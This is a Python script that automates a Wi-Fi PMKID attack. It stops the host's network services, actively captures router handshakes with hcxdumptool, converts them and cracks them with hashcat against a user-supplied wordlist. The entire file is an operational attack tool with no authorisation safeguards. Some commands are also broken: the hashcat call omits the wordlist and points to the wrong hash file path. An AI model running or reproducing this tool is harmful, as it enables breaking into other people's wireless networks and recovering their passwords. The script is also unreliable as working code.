#!/usr/bin/env python3
# Written bY Auxgrep and sh3dyz

import os
import subprocess
import platform
import sys
import time

# Colors

ITALIC = "\033[3m"
purple = '\x1b[38;5;165m'
blue = '\x1b[38;5;33m'
red = '\x1b[38;5;196m'
green = '\x1b[38;5;118m'
grey = '\x1b[38;5;0m'
pink = '\x1b[38;5;199m'
END = "\033[0m"
UNDERLINE = "\033[4m"
BOLD = "\033[1m"
BLINK = "\033[5m"

location = os.getcwd()
stx = 15

# config
crack_signal = 22000
hashcat_format_file = f'dumpNetworks.hc{crack_signal}'
file_from_recon = 'recon_dumped.pcapng'
network_list = 'Sniffed_Network_Names-SSID'

# file (output file)
make_it = f'{location}/mk47/recon_dumped.pcapng'

# check os
_os = platform.system()

if _os != 'Linux':
    sys.exit(f'{red}{BOLD}{ITALIC}Only linux is suported to run this module, Exiting!!!{END}')

# interface detection 
interface_check = os.listdir('/sys/class/net')

class mk47:
    # 1. CAPTURING PMKID HASHES FROM VULN NETWORKS - ROUTERS
    try:      
        for x in interface_check:
            time.sleep(0.15)
            print(f'{BOLD}{red}--->{END}{BOLD}{green} {x}{END}')
        print('')
        choice = str(input(f'{pink}{BOLD}Choose your External adapter interface:{END} '))

        if choice in interface_check:
            os.system('clear')
            try:
                print(f'{BOLD}{pink}{ITALIC}Your Going to loose a connection before starting this Attack{END}'.center(120))
                os.system('sudo systemctl stop NetworkManager.service')
                os.system('sudo systemctl stop wpa_supplicant.service')
                time.sleep(4)
                os.system('clear')
                print(f'{BOLD}{pink}{ITALIC}Relax we are going to start a module soon!!!{END}'.center(100))
                os.system('clear')
                print(f'{BOLD}{red}Starting a Module!!!!.....Wait{END}'.center(100))
                time.sleep(5)
                print(f'{BOLD}{pink}{ITALIC}PLease !! press CTRL + C if your finished to sniff{END}'.center(100))
                subprocess.call(f'sudo hcxdumptool -i {choice} -o {make_it} --active_beacon --enable_status={stx}', shell=True)
                os.system('clear')
                print(f'Wait!! We are Exporting captured Networks from {file_from_recon}'.center(100))
                cmd = subprocess.run(["systemctl", "start", "NetworkManager.service"], stderr=subprocess.DEVNULL, \
                    stdout=subprocess.DEVNULL)
                time.sleep(2)
                cmd2 = subprocess.run(["systemctl", "start", "wpa_supplicant.service"], stderr=subprocess.DEVNULL, \
                    stdout=subprocess.DEVNULL)
                cmd3 = os.system(f'sudo hcxpcapngtool -o mk47/{hashcat_format_file} -E mk47/{network_list} {make_it}')
                

    # CRACKING THE PMKID HASHES 
                os.system('clear')
                print(f'{BOLD}{pink}NOW lets cracking the PMKID HASHES{END}'.center(100))
                print('')

                word_list = str(input('Enter full location of your passwords wordlist(eg: /home/auxgrep/Desktop/password.txt): '))

                if os.path.exists(word_list):
                    subprocess.run(f'sudo hashcat -m 22000 {hashcat_format_file} -o cracked_Networks.txt', shell=True)
                    os.system(f'sudo mv {make_it} mk47/{network_list} mk47/{hashcat_format_file} mk47/OLD')
                else:
                    sys.exit(f'{word_list} not in path')

            except OSError:
                time.sleep(3)
                os.system('clear')
                sys.exit('Unkwown Error occured!!!')
        else:
            os.system('clear')
            print(f'{BOLD}{ITALIC}{red}Interface {choice} not founded in your Linux Box!! Exiting{END}')
            time.sleep(5)
            
    except KeyboardInterrupt:
        os.system('clear')
        print('Cancelled!!! GoodBye!!')
        time.sleep(2)
        sys.exit()    
